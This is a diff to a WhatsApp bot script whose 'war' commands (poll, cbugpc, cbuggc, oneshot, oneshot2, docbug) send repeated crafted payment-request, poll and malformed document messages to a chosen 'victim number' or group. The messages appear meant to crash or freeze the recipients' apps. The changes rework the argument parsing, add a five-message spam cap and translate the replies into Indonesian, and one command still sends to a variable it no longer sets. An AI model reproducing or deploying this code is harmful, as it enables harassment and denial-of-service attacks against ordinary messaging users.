@@ -402,9 +402,7 @@ return }
 				//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
 	//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
 	//-------------------â˜£ï¸WAR FUNCTIONSâ˜£ï¸-----------------\\
-	const deploy = (teks) => {
-  XeonBotInc.relayMessage(m.chat, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
-}
+	
 
 const doc = { 
 key: {
@@ -617,9 +615,9 @@ switch(command) {
 //-------------------â˜£ï¸WAR FEATURESâ˜£ï¸-----------------\\
 case 'poll': {
 if (!isPremium && !isCreator) return reply(mess.premi)
-let bwa = q.split('|')[0]
-let jumlah = q.split('|')[1]
-if (jumlah >= 5) return reply(`spam`)
+bwa = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
 for (let i = 0; i < jumlah; i++) {
 var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "pollCreationMessage": {
@@ -645,14 +643,17 @@ var pollCreation = generateWAMessageFromContent(m.chat, proto.Message.fromObject
 	}
 }), { userJid: m.chat, quoted: doc })
 XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, pollCreation.message, { messageId: pollCreation.key.id })
+const deploy = (teks) => {
+  XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, { requestPaymentMessage: { Message: { extendedTextMessage: { text: teks, currencyCodeIso4217: 'IDR', requestFrom: '0@s.whatsapp.net', expiryTimestamp: 8000, amount: 1, background: thumb }}}}, {})
+}
 deploy('Successful sendbug')
 }
-reply(`success`)
+reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*)
 
 }
 break
 case 'thisbug': {
-if (!isPremium && !isCreator) return reply(mess.premi)
+if (!isCreator) return reply(mess.premi)
 let teks = `â•â•âœªã€˜ *THIS IS A BUG BRO? â˜ºï¸* ã€™âœªâ•â•
  âž² *Message : ${q ? q : 'empty'}*\n\n`
 for (let mem of participants) {
@@ -664,79 +665,80 @@ break
 case 'cbugpc': {
 	if (!isPremium && !isCreator) return reply(mess.premi)
 if (args.length < 1) return m.reply(`*Error!*\n\nUse : ${command} victim number|spam amount|timer\nExample : ${command} 916909s.whatsapp.net|1|10s\n\n\ns = Second\n\n`)
-num = q.split('|')[0]
-jumlah = q.split('|')[1]
-if (jumlah >= 5) return reply(`spam`)
+num = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
 for (let i = 0; i < jumlah; i++) {
 m.reply(`Okay sir!`)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
-var requestPaymentMessage = generateWAMessageFromContent(`${bwa}@s.whatsapp.net`, proto.Message.fromObject({
+var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
 "text": botname,
 }
-}}), { userJid: `${bwa}@s.whatsapp.net`, quoted: doc})
-XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}}), { userJid: m.chat, quoted: doc})
+XeonBotInc.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 }
-m.reply(`Success Sending Bug To: ${num}\nAmount Spam: ${jumlah}`)
+m.reply(`Bug Telah Dikirim Ke: *${num}*\nJumlah Spam: *${jumlah}*`)
 }
 break
 case 'cbuggc': {
 if (!isPremium && !isCreator) return reply(mess.premi)
 if (args.length < 1) return m.reply(`*Syntax Error!*\n\nUse : ${command} idGroup|amount spam|timer\nExample : ${command} 916909@g.us|1|10s\n\n\ns = Second\n\nMake sure the bot has entered the group`)
-num = q.split('|')[0]
-jumlah = q.split('|')[1]
+num = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
 for (let i = 0; i < jumlah; i++) {
 m.reply(`Okay sir`)
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./XBug/xpic.jpeg') }, { upload: XeonBotInc.waUploadToServer })
-var requestPaymentMessage = generateWAMessageFromContent(`${bwa}@s.whatsapp.net`, proto.Message.fromObject({
+var requestPaymentMessage = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "requestPaymentMessage": {
 "currencyCodeIso4217": "IDR",
 "amount1000": "100",
 "extendedTextMessage": {
 "text": `MY DEVELOPER HW MODS WA`,
 }
-}}), { userJid: `${bwa}@s.whatsapp.net`, quoted: doc})
-XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
+}}), { userJid: m.chat, quoted: doc})
+XeonBotInc.relayMessage(`${num}@s.whatsapp.net`, requestPaymentMessage.message, { messageId: requestPaymentMessage.key.id })
 }
-m.reply(`Success Send Bug To: ${num}\nAmount Spam: ${jumlah}`)
+m.reply(`Bug Telah Dikirim Ke: *${num}*\nJumlah Spam: *${jumlah}*`)
 }
 break
 case 'oneshot': {
 if (!isPremium && !isCreator) return reply(mess.premi)
-let bwa = q.split('|')[0]
-let jumlah = q.split('|')[1]
-if (jumlah >= 5) return reply(`spam`)
+bwa = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
 for (let i = 0; i < jumlah; i++) {
 lodaChoos = fs.readFileSync('./XBug/randiKaBaccha.sound')
 XeonBotInc.sendMessage(`${bwa}@s.whatsapp.net`, {document: lodaChoos, mimetype: 'application/octet-stream', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
 }
-m.reply(`Success Send Bug To: ${bwa}\nAmount Spam: ${jumlah}`)
+m.reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)
 
 }
 break
 case 'oneshot2': {
 if (!isPremium && !isCreator) return reply(mess.premi)
-let bwa = q.split('|')[0]
-let jumlah = q.split('|')[1]
-if (jumlah >= 5) return reply(`spam`)
+bwa = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
 for (let i = 0; i < jumlah; i++) {
  lodaChoos2 = fs.readFileSync('./XBug/randiKaBaccha.sound')
  XeonBotInc.sendMessage(`${bwa}@s.whatsapp.net`, {document: lodaChoos2, mimetype: '', fileName:`${botname} ${xeonbut2}.sound` }, {quoted:doc})
  }
- m.reply(`Success Send Bug To: ${bwa}\nAmount Spam: ${jumlah}`)
+ m.reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)
 
  }
  break
 case 'docbug': {
 if (!isPremium && !isCreator) return reply(mess.premi)
-let bwa = q.split('|')[0]
-let jumlah = q.split('|')[1]
-if (jumlah >= 5) return reply(`spam`)
+num = q.split('.')[0]
+jumlah = q.split('.')[1]
+if (jumlah >= 5) return reply(`_Jumlah Maksimal 5_`)
 for (let i = 0; i < jumlah; i++) {
-var document = generateWAMessageFromContent(`${bwa}@s.whatsapp.net`, proto.Message.fromObject({	
+var document = generateWAMessageFromContent(m.chat, proto.Message.fromObject({	
 "documentMessage": {
 "url": "https://mmg.whatsapp.net/d/f/AjZ6wydBPTW9LotpjZK5gSstbxj0L_B2sCeSm-JWLPPS.enc",
 "mimetype": "",
@@ -749,10 +751,10 @@ var document = generateWAMessageFromContent(`${bwa}@s.whatsapp.net`, proto.Messa
 "directPath": "/v/t62.7119-24/19245462_2210838589082189_6252828231656384414_n.enc?ccb=11-4&oh=01_AVxdbYsmdj4IcIAC5_cBEX2zk7LnBmgTLyqZ7H83Z0Ci_g&oe=6303EB20",
 "mediaKeyTimestamp": "1658703206",
 }
-}), { userJid: `${bwa}@s.whatsapp.net` })
+}), { userJid: m.chat })
 XeonBotInc.relayMessage(`${bwa}@s.whatsapp.net`, document.message, { messageId: document.key.id })
 }
-m.reply(`Success Send Bug To: ${bwa}\nAmount Spam: ${jumlah}`)
+m.reply(`Bug Telah Dikirim Ke: *${bwa}*\nJumlah Spam: *${jumlah}*`)
 
 }
 break
